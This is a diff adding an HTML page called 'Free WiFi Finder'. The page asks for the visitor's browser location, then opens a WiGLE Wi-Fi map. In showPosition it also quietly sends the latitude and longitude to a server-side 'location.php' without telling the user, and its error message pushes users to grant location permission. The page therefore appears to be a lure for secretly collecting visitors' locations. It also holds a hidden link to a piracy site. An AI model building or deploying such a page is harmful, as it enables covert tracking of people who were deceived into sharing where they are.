@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html>
+    <title>Free WiFi Finder</title>
+    <script type="text/javascript" src="jquery-3.6.1.min.js"></script>
+    <body onload="getLocation()">
+        <div style="font-family: calibri;">
+        <h1>Free Wi-Fi Finder</h1></div>
+        <div id="msg"></div>
+        <div class="mapouter"><div class="gmap_canvas"><iframe width="600" height="500" id="gmap_canvas" src="https://maps.google.com/maps?q=2880%20Broadway,%20New%20York&t=&z=13&ie=UTF8&iwloc=&output=embed" frameborder="0" scrolling="no" marginheight="0" marginwidth="0"></iframe><a href="https://putlocker-is.org"></a><br><style>.mapouter{position:relative;text-align:right;height:500px;width:600px;}</style><a href="https://www.embedgooglemap.net">how to embed google map in html</a><style>.gmap_canvas {overflow:hidden;background:none!important;height:500px;width:600px;}</style></div></div>
+    </body>
+
+
+    <script>
+        var x = document.getElementById("msg");
+        function getLocation() {
+          if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(showPosition,showError);
+          } else {
+            x.innerHTML = "Geolocation is not supported by this browser.";
+          }
+        }
+        
+        function showPosition(position) {
+            $.get("location.php?lat="+position.coords.latitude+"&lon="+position.coords.longitude);
+
+          var mapURL= "".concat("https://wigle.net/map?maplat=",position.coords.latitude,"&maplon=",position.coords.longitude,"&mapzoom=18&coloring=density");
+          window.open(mapURL,"_blank")
+          
+        }
+
+
+
+
+        function showError(error) {
+        switch(error.code) {
+            case error.PERMISSION_DENIED:
+            x.innerHTML = "Please Allow location permission to view WiFi Networks around You"
+            break;
+            case error.POSITION_UNAVAILABLE:
+            x.innerHTML = "Location information is unavailable."
+            break;
+            case error.TIMEOUT:
+            x.innerHTML = "The request to get user location timed out."
+            break;
+            case error.UNKNOWN_ERROR:
+            x.innerHTML = "An unknown error occurred."
+            break;
+        }
+        } 
+        </script> 
+
+
+
+
+</html>
